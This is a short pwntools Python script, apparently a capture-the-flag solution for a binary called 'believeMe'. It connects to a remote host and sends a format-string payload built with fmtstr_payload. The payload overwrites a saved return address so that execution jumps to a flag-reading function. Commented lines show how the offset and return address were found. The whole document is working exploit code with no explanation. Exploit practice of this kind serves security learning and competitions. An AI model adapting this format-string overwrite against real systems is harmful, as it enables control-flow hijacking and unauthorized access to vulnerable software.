from pwn import *
# context.log_level = 'DEBUG'
local = 0
if local:
	p = process('./believeMe')
else:
	p = remote('18.223.228.52', 13337)
flag_addr = 0x0804867B
ret_addr = 0xffffdd2c # local: 0xffffd2bc
offset = 9
# payload = p32(0xdeadbeef) + '%{}$p'.format(str(offset)) # test offset
# payload = '0x%21$08x' # test ret_addr
# payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'
payload = fmtstr_payload(offset, {ret_addr:flag_addr}, write_size='short')
assert(len(payload) < 39)
p.recvuntil('????')
# gdb.attach(p, 'b *0x80487d3\nc')
p.sendline(payload)
p.interactive()
